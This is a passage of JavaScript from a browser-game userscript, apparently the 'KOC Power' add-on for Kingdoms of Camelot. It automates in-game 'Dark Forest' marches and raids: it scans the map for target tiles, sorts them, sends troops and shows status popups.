	document.getElementById('Options').addEventListener('click', t.barbOptions , false);
	document.getElementById('troopselect').addEventListener('click', t.troopOptions , false);
    var element_class = document.getElementsByClassName('pblevelopt');
    for (k=0;k<element_class.length;k++){
    	element_class[k].addEventListener('click', t.saveLevelOptions , false);
    }
   },
  
  saveLevelOptions : function(){
		for(i=0;i<Seed.cities.length;i++){
			AttackOptions.Levels[i+1][0]=false;
			for (w=1;w<=10;w++){
				var ele = document.getElementById('pbcity'+i+'level'+w);
				AttackOptions.Levels[i+1][w]=ele.checked;
				if (ele.checked)					
					AttackOptions.Levels[i+1][0]=true;
			}		
		}
		saveAttackOptions();
   },
   
  troopOptions: function(){
  	 var t = Tabs.DarkForest;
	 var troopDef = [
	  [culang.shrsupply, 1],
      [culang.shrmilitiaman, 2],
      [culang.scout, 3],
      [culang.shrpikeman, 4],
	  [culang.shrswordsman, 5],
      [culang.shrtarcher, 6],
      [culang.shrcavalry, 7],
      [culang.shrheavycavalry, 8],
      [culang.shrsupplywagon, 9],
      [culang.shrballista, 10],
      [culang.shrbatteringram, 11],
	  [culang.shrcatapult, 12],
     ];
  	 if(t.troopselect == null)	
		t.troopselect = new CPopup ('pbtroopselect', 0, 0, 746, 100, true, function(){t.saveTroops();});
  	 t.troopselect.centerMe (mainPop.getMainDiv());  
  	 var z= '<DIV id=pbTraderDivD class=pdxStat>'+culang.HselTroops+'</div><TABLE class=pdxTab width=100%><TR>';
	 z+='<TD></td>';
	 for(var i=0; i<troopDef.length; i++)
		z+='<TD>'+troopDef[i][0]+'</td>';
	 z+='<TD>'+culang.min+' '+culang.shrdist+'</td><TD>'+culang.max+' '+culang.shrdist+'</td>';
	 for(i=0;i<10;i++){
	 	z += '<TR><TD>'+culang.level+' '+(i+1)+': </td>';
	 	for(var j=0; j<troopDef.length; j++){
	 		z += '<TD><INPUT id="level'+i+'troop'+j+'" type=text size=4 maxlength=6 value="'+AttackOptions.Troops[i+1][j+1]+'" /></td>';
	 	}
		z+='<TD align=left><INPUT id=Mindist'+i+' type=text size=3 maxlength=3 value="'+AttackOptions.MinDistance[i+1]+'"</td>';
	 	z+='<TD align=right><INPUT id=dist'+i+' type=text size=3 maxlength=3 value="'+AttackOptions.Distance[i+1]+'"</td>';
	 	z+='</tr>';		 		
	 }
	 z+='</table>';
	  t.troopselect.getMainDiv().innerHTML = z;
	  t.troopselect.show(true);
  },
  
  barbOptions: function(){
  	 var t = Tabs.DarkForest;
  	 if(t.barboptions == null)	
		t.barboptions = new CPopup ('pbbarboptions', 0,0, 747,280, true);
  	 t.barboptions.centerMe (mainPop.getMainDiv());  
	 t.barboptions.getTopDiv().innerHTML = '<b><div class=showBadged><center>'+culang.darkforest+' '+getServerId()+'</center></div></b>';
	var y = '<DIV style="max-height:600px; overflow-y:auto;"><DIV class=pdxStat>'+culang.DFreset+'</div><TABLE width=100%>';
	y +='<TR><TD style="margin-top:5px; text-align:center;"><INPUT id=pbresetbarbs type=submit value="'+culang.Hreset+'"></td>';
	y +='<TD style="margin-top:5px; text-align:center;"><INPUT id=pbpaintbarbs type=submit value="'+culang.show+'"></td>';
	y += '<TD><SELECT id=pbcity type=list></td></tr></table>';
	y +='<TD style="margin-top:5px; text-align:center;"><DIV class=pdxStat>'+culang.Hsettings+'</div></td><TABLE>';
	y +='<TR><TD>'+culang.DFintervall+': <INPUT id=pbsendint type=text size=4 maxlength=4 value='+ AttackOptions.SendInterval +' \> '+culang.DFintervall2+'</td></tr>';
	y +='<TR><TD>'+culang.maxsearchdist+': <INPUT id=pbmaxdist type=text size=4 maxlength=4 value='+ AttackOptions.MaxDistance +' \></td></tr>';
	y +='<TR><TD>'+culang.keeprp+' <INPUT id=rallyclip type=text size=1 maxlength=2 value="'+AttackOptions.RallyClip+'" \> '+culang.keeprp2+'</td></tr>';
	y +='<TR><TD><INPUT id=pbreport type=checkbox '+(AttackOptions.UpdateEnabled?'CHECKED':'')+'\> '+culang.DFresetsearch+' <INPUT id=pbmsgint type=text size=2 maxlength=2 value='+AttackOptions.UpdateInterval+' \> '+culang.DFresetsearch2+'</td></tr>';
	y +='<TR><TD>'+culang.DFskip+' <INPUT id=barbstopsearch type=text size=4 value='+AttackOptions.stopsearch+' \> '+culang.DFskip2+'</td></tr>';
	y +='<TR><TD>'+culang.STmethode+': '+htmlSelector({distance:''+culang.distance+'', level:''+culang.DFhighlvl+'', lowlevel:''+culang.DFlovlvl+''}, AttackOptions.Method, 'id=pbmethod')+'</td></tr>';
	y +='<TR><TD>'+culang.DFknights+': '+htmlSelector({0:''+culang.DFlowskill+'', 1:''+culang.DFhighskill+''}, AttackOptions.knightselector, 'id=barbknight')+'</td></tr>';
	y+='</table></td></tr></table>';


	t.barboptions.getMainDiv().innerHTML = y;
	t.barboptions.show(true);
	
	document.getElementById('pbcity').options.length=0;
	for (i=0;i<Seed.cities.length;i++){
		var o = document.createElement("option");
		o.text = Seed.cities[i][1]
		o.value = i+1;
		document.getElementById("pbcity").options.add(o);
	}
	   
	document.getElementById('pbpaintbarbs').addEventListener('click', function(){
			t.showBarbs(document.getElementById("pbcity").value,Seed.cities[document.getElementById("pbcity").value -1][1]);
			
    },false);
	document.getElementById('pbresetbarbs').addEventListener('click', t.deletebarbs,false);
	document.getElementById('pbmethod').addEventListener('change', function(){
		AttackOptions.Method=document.getElementById('pbmethod').value;
		saveAttackOptions();
		t.checkBarbData();
	},false);
	document.getElementById('barbknight').addEventListener('change', function(){
		AttackOptions.knightselector=document.getElementById('barbknight').value;
		saveAttackOptions();
	},false);
	document.getElementById('pbreport').addEventListener('change', function(){
		AttackOptions.UpdateEnabled=document.getElementById('pbreport').checked;
		saveAttackOptions();
	},false);
	document.getElementById('pbmsgint').addEventListener('change', function(){
		AttackOptions.UpdateInterval=parseInt(document.getElementById('pbmsgint').value);
		saveAttackOptions();
	},false);
    document.getElementById('pbsendint').addEventListener('change', function(){
		if(parseInt(document.getElementById('pbsendint').value) <5) //Set minimum attack interval to 5 seconds
			document.getElementById('pbsendint').value = 5;
		AttackOptions.SendInterval=parseInt(document.getElementById('pbsendint').value);
		saveAttackOptions();
	},false);
    document.getElementById('pbmaxdist').addEventListener('change', function(){
		if(parseInt(document.getElementById('pbmaxdist').value) > 125)
			document.getElementById('pbmaxdist').value = 125;
		AttackOptions.MaxDistance=parseInt(document.getElementById('pbmaxdist').value);
		saveAttackOptions();
	},false);
    document.getElementById('rallyclip').addEventListener('change', function(){
		AttackOptions.RallyClip=parseInt(document.getElementById('rallyclip').value);
		saveAttackOptions();
	},false);
    document.getElementById('barbstopsearch').addEventListener('change', function(){
		document.getElementById('barbstopsearch').value = parseInt(document.getElementById('barbstopsearch').value)>0?document.getElementById('barbstopsearch').value:1
		AttackOptions.stopsearch=parseInt(document.getElementById('barbstopsearch').value);
		saveAttackOptions();
	},false);

  },
  
    showBarbs: function (citynumber,cityname) {
		var t = Tabs.DarkForest;
		var popTradeRoutes = null;
		t.popTradeRoutes = new CPopup('pbShowBarbs', 0, 0, 746, 300, true, function() {clearTimeout (1000);});
		var m = '<DIV style="max-height:460px;  overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 width=100% class="pbShowBarbs" id="pbBars">';       
		t.popTradeRoutes.getMainDiv().innerHTML = '</table></div>' + m;
		t.popTradeRoutes.getTopDiv().innerHTML = '<div class=showBadged><B><center>'+culang.DFforcity+': '+cityname+'</b></center></div>';
		t.paintBarbs(citynumber,cityname);
		t._addTabHeader(citynumber,cityname);
		t.popTradeRoutes.show(true)	;
	 },
  	paintBarbs: function(i,cityname){
	        var t = Tabs.DarkForest;
				for (k=(t.barbArray[i].length-1);k>=0;k--){t._addTab(i,cityname,k+1,t.barbArray[i][k]['x'], t.barbArray[i][k]['y'],t.barbArray[i][k]['dist'], t.barbArray[i][k]['level']);}
		},
	  
  _addTab: function(citynumber,cityname,queueId,X,Y,dist,level){
	 var t = Tabs.DarkForest;
	 var row = document.getElementById('pbBars').insertRow(0);
	 row.vAlign = 'top';
	 row.insertCell(0).innerHTML = queueId;
	 row.insertCell(1).innerHTML = X;
	 row.insertCell(2).innerHTML = Y;
	 row.insertCell(3).innerHTML = dist;
	 row.insertCell(4).innerHTML = level;
	 row.insertCell(5).innerHTML = '<a class="button20" id="barbdel_' + queueId + '"><span>'+culang.deleteb+'</span></a>';
	 document.getElementById('barbdel_' + queueId).addEventListener('click', function(){
		t.deleteBarbElement(citynumber,queueId,cityname, true);
	 }, false);
  },
	 
  _addTabHeader: function(citynumber,cityname) {
	 var t = Tabs.DarkForest;
	 var row = document.getElementById('pbBars').insertRow(0);
	 row.vAlign = 'top';
	 row.insertCell(0).innerHTML = culang.city;
	 row.insertCell(1).innerHTML = "X";
	 row.insertCell(2).innerHTML = "Y";
	 row.insertCell(3).innerHTML = culang.shrdist;
	 row.insertCell(4).innerHTML = culang.lvl;
	 row.insertCell(5).innerHTML = '<a class="button20" id="barbdelAll"><span>'+culang.deleteallb+'</span></a>';
	 document.getElementById('barbdelAll').addEventListener('click', function(){
		t.deleteBarbsCity(citynumber,cityname);
	 }, false);
  },   
	   
  deleteBarbElement: function(citynumber,queueId,cityname,showFlag){
      var t = Tabs.DarkForest;
      var queueId = parseInt(queueId);
      var myarray = t.barbArray[citynumber];
      if (myarray) {
        myarray.splice((queueId-1), 1);
        GM_setValue('DF_' + Seed.player['name'] + '_city_' + citynumber + '_' + getServerId(), JSON2.stringify(myarray));
        t.checkBarbData();
        if (showFlag) t.showBarbs(citynumber,cityname);
      }
      // else 
      // {
	      //logit("not found");
      // }
  },
	  
  deleteBarbsCity: function(citynumber,cityname){
      var t = Tabs.DarkForest;
      var queueId = parseInt(queueId);
	  AttackOptions.Update[citynumber][1] = 0;
      GM_deleteValue('DF_' + Seed.player['name'] + '_city_' + citynumber + '_' + getServerId())
      t.checkBarbData();
      t.showBarbs(citynumber,cityname);
      reloadKOC();
  },  
  
  saveTroops: function(){
    for(i=0;i<10;i++){
  	 	for (w=0;w<12;w++){
  	 		AttackOptions.Troops[i+1][w+1] = parseIntNan(document.getElementById('level'+i+'troop'+w).value);
  	 	}
		if(parseIntNan(document.getElementById('dist'+i).value) > AttackOptions.MaxDistance)
			document.getElementById('dist'+i).value = AttackOptions.MaxDistance;
		AttackOptions.MinDistance[i+1] = parseIntNan(document.getElementById('Mindist'+i).value);
  	 	AttackOptions.Distance[i+1] = parseIntNan(document.getElementById('dist'+i).value);	 		
	 }
	 saveAttackOptions();
  },
  
   deletebarbs: function(){
	for (i=1;i<=Seed.cities.length;i++){
		AttackOptions.Update[i][1] = 0;
		GM_deleteValue('DF_' + Seed.player['name'] + '_city_' + i + '_' + getServerId())
	}
	reloadKOC();
   },

  checkBarbData: function(){
  	var t = Tabs.DarkForest;
	if(!AttackOptions.Running) return;
	  for (i=1;i<=Seed.cities.length;i++){
	  
		// if(GM_getValue('Barbs_' + Seed.player['name'] + '_city_' + i + '_' + getServerId())) //Remove old auto barb data
		// GM_deleteValue('Barbs_' + Seed.player['name'] + '_city_' + i + '_' + getServerId());
		if (!AttackOptions.Levels[i][0]) continue; //Skip city if not selected
		t.barbArray[i] = [];
	  	var myarray = JSON2.parse(GM_getValue('DF_' + Seed.player['name'] + '_city_' + i + '_' + getServerId(),"[]"));
		
		if ((myarray == undefined || myarray.length == 0) && t.searchRunning==false) {
	  		t.lookup=i;
			if(parseInt(AttackOptions.Update[t.lookup][1]) >= parseInt(AttackOptions.stopsearch)) continue; //Skip if search results are empty more than X times
			t.searchRunning = true;
	  		t.opt.startX = parseInt(Seed.cities[(i-1)][2]);
	  		t.opt.startY = parseInt(Seed.cities[(i-1)][3]);  
	  		t.clickedSearch();
			break;
	  	}
		if (myarray){
			if(AttackOptions.Method == 'distance') t.barbArray[i] = myarray.sort(function sortBarbs(a,b) {a = a['dist'];b = b['dist'];return a == b ? 0 : (a < b ? -1 : 1);});
			if(AttackOptions.Method == 'level') t.barbArray[i] = myarray.sort(function sortBarbs(a,b) {a = a['level']+a['dist'];b = b['level']+b['dist'];return a == b ? 0 : (a > b ? -1 : 1);});
			if(AttackOptions.Method == 'lowlevel') t.barbArray[i] = myarray.sort(function sortBarbs(a,b) {a = a['level']+a['dist'];b = b['level']+b['dist'];return a == b ? 0 : (a < b ? -1 : 1);});
	  		GM_setValue('DF_' + Seed.player['name'] + '_city_' + i + '_' + getServerId(), JSON2.stringify(t.barbArray[i]));
	  	}
		AttackOptions.Update[i][1] = 0;
		saveAttackOptions();
	  }
	  t.nextattack = setTimeout(t.getnextCity, parseInt((Math.random()*2000)+2000));
  },
  
  toggleBarbState: function(obj){
	var t = Tabs.DarkForest;
	if (AttackOptions.Running == true) {
		AttackOptions.Running = false;
		obj.value = culang.darkforest+" = "+culang.buttonoff;
		saveAttackOptions();
		t.nextattack = null;
	} else {
		AttackOptions.Running = true;
		obj.value = culang.darkforest+" = "+culang.buttonon;
		saveAttackOptions();
		t.checkBarbData();
		t.nextattack = setTimeout(t.getnextCity, parseInt((Math.random()*2000)+2000));
	}
  },
  
  barbing : function(){
  	   var t = Tabs.DarkForest;
	   var city = t.city;
      
       citynumber = Seed.cities[city-1][0];
       cityID = 'city' + citynumber; 
	   
       t.getAtkKnight(cityID);
       t.getRallypointLevel(cityID);
       if (t.rallypointlevel > 11 ) t.rallypointlevel = 11;
	   //else if (t.rallypointlevel > 12 ) t.rallypointlevel = 11;
	   var slots=0;
	   if (Seed.queue_atkp[cityID] != undefined){
	       for(var k in Seed.queue_atkp[cityID])
		    slots++;
		   if(Seed.queue_atkp[cityID].toSource() == "[]")
			slots = 0;
		} else
			slots=0; 
       
	   var element1 = 'pddatacity'+(city-1);
       document.getElementById(element1).innerHTML = ''+culang.send+': ' + AttackOptions.BarbsDone[city]; 
       var element2 = 'pddataarray'+(city-1); 
       document.getElementById(element2).innerHTML =  ''+culang.shrrp+': (' + slots + '/' + t.rallypointlevel +')';
	   
	   if ((t.rallypointlevel-AttackOptions.RallyClip) <= slots) return;
	   if (t.knt.toSource() == "[]") return; 
	   var kid = t.knt[0].ID;
	   
	   if(t.barbArray[city].length > 0)
		var barbinfo = t.barbArray[city].shift();
	   else if(parseInt(AttackOptions.Update[city][1])==0){
		t.checkBarbData();
		return;
	   } else
	   return;
       var check=0;
       var barblevel = parseInt(barbinfo.level);
		
		if (AttackOptions.Levels[city][barbinfo.level])
			check=1;
		
        if (barbinfo.dist < AttackOptions.MinDistance[barblevel] || barbinfo.dist > AttackOptions.Distance[barblevel]){
			check=0;
			GM_setValue('DF_' + Seed.player['name'] + '_city_' + city + '_' + getServerId(), JSON2.stringify(t.barbArray[city]));
			return;
		}

         // check troop levels in city
         var trps = AttackOptions.Troops[barblevel];
         var num_troops = 0;
         for (var ii=1; ii<13; ii++) {
	        if (parseInt(trps[ii]) > Seed.units[cityID]['unt'+ii]) check = 0;
	        num_troops += trps[ii];
         }
         if (num_troops == 0) check = 0;
         
       if (check == 0){
		t.barbArray[city].push(barbinfo);
		GM_setValue('DF_' + Seed.player['name'] + '_city_' + city + '_' + getServerId(), JSON2.stringify(t.barbArray[city]));
		return;
	   }
	   
	   var element = 'pdtotalcity'+(city-1);
		if (t.barbArray[city] == undefined) document.getElementById(element).innerHTML = ''+culang.DFnodata+'';
		else document.getElementById(element).innerHTML =  ''+culang.forests+': ' + t.barbArray[city].length;
	   
	   var xcoord = barbinfo['x'];
       var ycoord = barbinfo['y'];
       t.doBarb(citynumber,city,xcoord,ycoord,barblevel,kid,trps);
       saveAttackOptions();
  },

  getnextCity: function(){
	var t = Tabs.DarkForest;
	if(t.searchRunning || !AttackOptions.Running) return;
	t.nextattack = setTimeout(t.getnextCity, parseInt((Math.random()*3)+AttackOptions.SendInterval)*1000);
	
	var city = t.city+1;
	if (city>Seed.cities.length){
		city=1;
	}
	t.city = city;
	if(AttackOptions.UpdateEnabled){
		var now = unixTime();
		if(now > parseInt(AttackOptions.Update[city][0] + (AttackOptions.UpdateInterval*60))){
		AttackOptions.Update[city][1]=0;
			t.barbArray[city] = []; //Clears data if last update was more than X minutes
			GM_setValue('DF_' + Seed.player['name'] + '_city_' + city + '_' + getServerId(), JSON2.stringify(t.barbArray[city]));
		}
	}
	
	if(AttackOptions.Levels[city][0])
		t.barbing();
  },
  
  getRallypointLevel: function(cityId){
    var t = Tabs.DarkForest;
    for (var o in Seed.buildings[cityId]){
  	var buildingType = parseInt(Seed.buildings[cityId][o][0]);
  	var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
  	if (buildingType == 12) t.rallypointlevel=parseInt(buildingLevel);
     }
  }, 
  
  getAtkKnight : function(cityID){
     var t = Tabs.DarkForest;
     t.knt = new Array();
     t.getRallypointLevel(cityID);
     for (k in Seed.knights[cityID]){
     		if (Seed.knights[cityID][k]["knightStatus"] == 1 && Seed.leaders[cityID]["resourcefulnessKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["politicsKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["combatKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["intelligenceKnightId"] != Seed.knights[cityID][k]["knightId"]){
     			t.knt.push ({
     				Name:   Seed.knights[cityID][k]["knightName"],
     				Combat:	Seed.knights[cityID][k]["combat"],
     				ID:		Seed.knights[cityID][k]["knightId"],
     			});
     		}
     }
     t.knt = t.knt.sort(function sort(a,b) {
							a = parseInt(a['Combat']);
							b = parseInt(b['Combat']);
							if(parseInt(AttackOptions.knightselector) > 0)
								return a == b ? 0 : (a > b ? -1 : 1);
							else
								return a == b ? 0 : (a < b ? -1 : 1);
							});    
  },
    
  doBarb: function(cityID,counter,xcoord,ycoord,level,kid,trps){
  		var t = Tabs.DarkForest;
  		
  		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  		params.cid=cityID;
  		params.type=4;
  	    params.kid=kid;
  		params.xcoord = xcoord;
  		params.ycoord = ycoord;
		for (ii=1; ii<13; ii++) {
			if(parseInt(trps[ii]) > 0)
				params['u'+ii]=trps[ii];
        }
  		
  		AttackOptions.BarbsTried++;
  		document.getElementById('pberror1').innerHTML = ''+culang.DFtries+':'+ AttackOptions.BarbsTried; 
  		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  		         loading: true,
  		         onSuccess: function (transport) {
				   var rslt = eval("(" + transport.responseText + ")");
				   if (rslt.ok) {
					 var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
					 var ut = unsafeWindow.unixtime();
					 var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
					 var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
					 for(i = 0; i <= unitsarr.length; i++){
						if(params["u"+i]){
						unitsarr[i] = params["u"+i];
						}
					 }
					 var currentcityid = params.cid;
					 unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
					 unsafeWindow.update_seed(rslt.updateSeed)
					 if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
					 var slots=0;
					 for(var k in Seed.queue_atkp['city'+cityID])
					  slots++;
					 if(Seed.queue_atkp['city'+cityID].toSource() == "[]")
					  slots = 0;
					 AttackOptions.BarbsDone[counter]++;
					 var element1 = 'pddatacity'+(counter-1);
					 document.getElementById(element1).innerHTML = ''+culang.send+': ' + AttackOptions.BarbsDone[counter]; 
					 var element2 = 'pddataarray'+(counter-1); 
					 document.getElementById(element2).innerHTML =  ''+culang.shrrp+': (' + slots + '/' + t.rallypointlevel +')';
					 var now = new Date().getTime()/1000.0;
					 now = now.toFixed(0);
					 GM_setValue('DF_' + Seed.player['name'] + '_city_' + counter + '_' + getServerId(), JSON2.stringify(t.barbArray[counter]));
					 saveAttackOptions();
				   } else {
					 //logit( inspect(rslt,3,1));
					 if (rslt.error_code != 8 && rslt.error_code != 213 && rslt.error_code == 210) AttackOptions.BarbsFailedVaria++;
					 if (rslt.error_code == 213)AttackOptions.BarbsFailedKnight++;
					 if (rslt.error_code == 210) AttackOptions.BarbsFailedRP++;
					 if (rslt.error_code == 8) AttackOptions.BarbsFailedTraffic++;
					 if (rslt.error_code == 104) {
					   AttackOptions.BarbsFailedBog++;
					   GM_setValue('DF_' + Seed.player['name'] + '_city_' + counter + '_' + getServerId(), JSON2.stringify(t.barbArray[counter]));
					   saveAttackOptions();
					 }
					 document.getElementById('pberror2').innerHTML = ''+culang.DFete+':' + AttackOptions.BarbsFailedTraffic; 
					 document.getElementById('pberror3').innerHTML = ''+culang.DFrpe+': '+ AttackOptions.BarbsFailedRP;
					 document.getElementById('pberror4').innerHTML = ''+culang.DFke+':' + AttackOptions.BarbsFailedKnight;
					 document.getElementById('pberror5').innerHTML = ''+culang.DFope+':' + AttackOptions.BarbsFailedVaria;
					 document.getElementById('pberror6').innerHTML = ''+culang.DFerr+':' + AttackOptions.BarbsFailedBog;
					 //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
					 }
  		         },
  		         onFailure: function () {}
  		 });
  	 saveAttackOptions();
  },
  
  sendreport: function(){
	  var t = Tabs.DarkForest;
	  var total = 0;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.emailTo = Seed.player['name'];
    params.subject = ""+culang.darkforest + culang.stats+"";
    var message = ''+culang.darkforest + culang.stats+': '+culang.DFsend+'' + '%0A';
    for (x=1;x<=Seed.cities.length;x++){	 
    	message+= Seed.cities[x-1][1] + ': (' + AttackOptions.BarbsDone[x] + '/' + t.barbArray[x].length +')' + '%0A';
    }
    message += '%0A'+ ''+culang.DFete+': ' + AttackOptions.BarbsFailedTraffic +'%0A';
    message += ''+culang.DFrpe+': ' + AttackOptions.BarbsFailedRP +'%0A';
    message += ''+culang.DFke+': ' + AttackOptions.BarbsFailedKnight +'%0A';
    message += ''+culang.DFope+': ' + AttackOptions.BarbsFailedVaria +'%0A';
    message += ''+culang.DFsends+': ' + (AttackOptions.BarbsTried - AttackOptions.BarbsFailedTraffic - AttackOptions.BarbsFailedRP - AttackOptions.BarbsFailedKnight -  AttackOptions.BarbsFailedVaria) +'%0A';
    //message += '%0A'+'%0A' + 'Food Gain (for '+AttackOptions.MsgInterval+' hour of barbing)' +'%0A';
   // for (q=1;q<=Seed.cities.length;q++){
    	//var cityID = 'city' + Seed.cities[q-1][0];
    	//var gain = parseInt(Seed.resources[cityID]['rec1'][0] / 3600) - AttackOptions.Foodstatus[q];
    	//message+= Seed.cities[q-1][1] + ': Start: ' + addCommas(AttackOptions.Foodstatus[q]) + ' End :' + addCommas(parseInt(Seed.resources[cityID]['rec1'][0] / 3600)) + ' Gain: ';
    	//message += addCommas(gain)  + '%0A';
		//total += gain;
  //  }
	//message += '%0A Total food gain : '+addCommas(total)+'%0A';
    params.message = message;
    params.requestType = "COMPOSED_MAIL";
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function (message) {
            var rslt = eval("(" + message.responseText + ")");
            if (rslt.ok) {
            } else {
            }
        },
        onFailure: function () {
        },
    });  
  },
  
  clickedSearch : function (){
    var t = Tabs.DarkForest;
    
    t.opt.maxDistance = parseInt(AttackOptions.MaxDistance); 
    t.opt.searchShape = 'circle'; 
    t.mapDat = [];
    t.firstX =  t.opt.startX - t.opt.maxDistance;
    t.lastX = t.opt.startX + t.opt.maxDistance;
    t.firstY =  t.opt.startY - t.opt.maxDistance;
    t.lastY = t.opt.startY + t.opt.maxDistance;
    t.tilesSearched = 0;
    t.tilesFound = 0;
    t.curX = t.firstX;
    t.curY = t.firstY;
    var xxx = t.MapAjax.normalize(t.curX);
    var yyy = t.MapAjax.normalize(t.curY);
    var element = 'pddatacity'+(t.lookup-1);
    document.getElementById(element).innerHTML = ''+culang.search+' '+ xxx +','+ yyy;
   
    setTimeout (function(){t.MapAjax.request (xxx, yyy, 15, t.mapCallback)}, MAP_DELAY);
  },
  
  mapCallback : function (left, top, width, rslt){
    var t = Tabs.DarkForest;
    if (!t.searchRunning)
      return;
    if (!rslt.ok){
      t.stopSearch ('ERROR: '+ rslt.errorMsg);
      return;
    }
    map = rslt.data;
	
    for (k in map){
	  if (map[k].tileType==54 && AttackOptions.Levels[t.lookup][map[k].tileLevel]){
	     var dist = distance (t.opt.startX, t.opt.startY, map[k].xCoord, map[k].yCoord);
		 if(dist <= parseInt(AttackOptions.MaxDistance))
			t.mapDat.push ({time:0,x:map[k].xCoord,y:map[k].yCoord,dist:dist,level:map[k].tileLevel});
	  }
    }
    
    t.tilesSearched += (15*15);

    t.curX += 15;
    if (t.curX > t.lastX){
      t.curX = t.firstX;
      t.curY += 15;
      if (t.curY > t.lastY){
	t.stopSearch(''+culang.found+': ' + t.mapDat.length);
        return;
      }
    }
    var x = t.MapAjax.normalize(t.curX);
    var y = t.MapAjax.normalize(t.curY);
    var element = 'pddatacity'+(t.lookup-1);
    document.getElementById(element).innerHTML = ''+culang.search+' '+ x +','+ y;
    setTimeout (function(){t.MapAjax.request (x, y, 15, t.mapCallback)}, MAP_DELAY);
  },
  
  stopSearch : function (msg){
  var t = Tabs.DarkForest;
	var element = 'pddatacity'+(t.lookup-1);
        document.getElementById(element).innerHTML = msg;
	GM_setValue('DF_' + Seed.player['name'] + '_city_' + t.lookup + '_' + getServerId(), JSON2.stringify(t.mapDat));
	AttackOptions.Update[t.lookup][0] = unixTime();
	AttackOptions.Update[t.lookup][1]++;
    t.searchRunning = false;
	saveAttackOptions();
	t.checkBarbData();
	return;
  },
    
  hide : function (){
  var t = Tabs.DarkForest;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){
  var t = Tabs.DarkForest;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

}; 
/***********************************************************************************/
/************ KOC POWER - TABS RAID ***********************************************/
/*********************************************************************************/
 Tabs.Raid = {
  tabDisabled : false,
  tabLabel : culang.raid,
  tabOrder : StyleOptions.toFarmen,
  myDiv : null,
  rallypointlevel:null,
  knt:{},
  Troops:{},
  city:0,
  raidtimer:null,
  rslt:{},
  save:{},
  stopping:false,
  resuming:false,
  deleting:false,
  stopprogress:0,
  stopcount:0,
  activecount:0,
  count:0,
  
  init : function (div){
    var t = Tabs.Raid;
    t.myDiv = div;
	t.raidtimer = setTimeout(t.checkRaids, 30000);
	setInterval(t.lookup, 2500);
	setInterval(t.sendreport, 1*60*1000);
	
	AddSubTabLink(''+culang.stopraids+'', t.StopAllRaids, 'pbraidtab');
	AddSubTabLink(''+culang.raitack+'', t.ResumeAllRaids, 'pbraidtabRes');
	AddSubTabLink(''+culang.deleteraid+'', t.DeleteAllRaids, 'pbraidtabDel');

	var m = '<DIV class=pdxStat>'+culang.Hraids+' - '+culang.Hsettings+'</div><TABLE width=100% height=0% class=pdxTab><TR align="center">';
	m += '<TD><INPUT id=pbRaidStart type=submit value="'+culang.raidreset+' = '+ (Options.RaidRunning?''+culang.buttonon+'':''+culang.buttonoff+'') +'" ></td>';
	m += '<TD><INPUT id=pbsendreport type=checkbox '+ (Options.foodreport?' CHECKED':'') +'\> '+culang.KTsendreport+' ';
	m += '<INPUT id=pbsendreportint value='+ Options.MsgInterval +' type=text size=3 \> '+culang.KTsendreport2+' </td>';
	m += '</tr></table></div>';
	m += '<DIV class=pdxStat>'+culang.HakvRaids+'</div><TABLE width=100% height=0% class=pdxTab><TR align="center">';
	m += '<TD><DIV style="margin-bottom:10px;"><b>'+culang.holyplace+':</b> <span id=ptRaidCity></span></div></td></tr>';
	m +='<TR><TD><DIV style="margin-bottom:10px;"><span id=ptRaidTimer></span></div><br><span style=\"font-size:10px; color:#555; line-height:18px; \"><font color=#600000><B><u>'+culang.impo+'</u></b></font>: '+culang.KTimpNotestopRaid+'</span></td></tr></table>';
	m += '<DIV id=PaintRaids></div>';
	m += '<DIV class=pdxStat>'+culang.HsaveRaids+'</div><TABLE width=100% height=0% class=pdxTab><TR align="center">';
	m += '<DIV id=SavedRaids></div>';
	t.myDiv.innerHTML = m;
	
	t.from = new CdispCityPicker ('ptRaidpicker', document.getElementById('ptRaidCity'), true, t.clickCitySelect, 0);
	document.getElementById('pbRaidStart').addEventListener('click', t.toggleRaidState, false);
	document.getElementById('pbsendreport').addEventListener('change', function(){
	Options.foodreport = document.getElementById('pbsendreport').checked;
	saveOptions();
	}, false);
	document.getElementById('pbsendreportint').addEventListener('change', function(){
	Options.MsgInterval = parseInt(document.getElementById('pbsendreportint').value);
	saveOptions();
	}, false);
	var serverID = getServerId();
	t.save = GM_getValue ('SavedRaids_'+serverID);
	if (t.save != undefined) t.save = JSON2.parse (t.save);
	
	setInterval (t.paint,1000);
  },
	
  lookup : function (){
      	var t = Tabs.Raid;
      	t.activecount=0;
      	t.stopcount=0;
      	for (c=0; c< Seed.cities.length;c++) {

	cityID = 'city' + Seed.cities[c][0];    
   				for (b in Seed.queue_atkp[cityID]){
   					destinationUnixTime = Seed.queue_atkp[cityID][b]['destinationUnixTime']; 
   					MarchStatus = Seed.queue_atkp[cityID][b]['marchStatus'];
   					MarchType = Seed.queue_atkp[cityID][b]['marchType'];
   					botMarchStatus = Seed.queue_atkp[cityID][b]['botMarchStatus'];
   					if (MarchType == 9 &&  MarchStatus == 3 || MarchStatus==10) t.stopcount++;
   					else if (MarchType == 9) t.activecount++;
   				}
	   		}
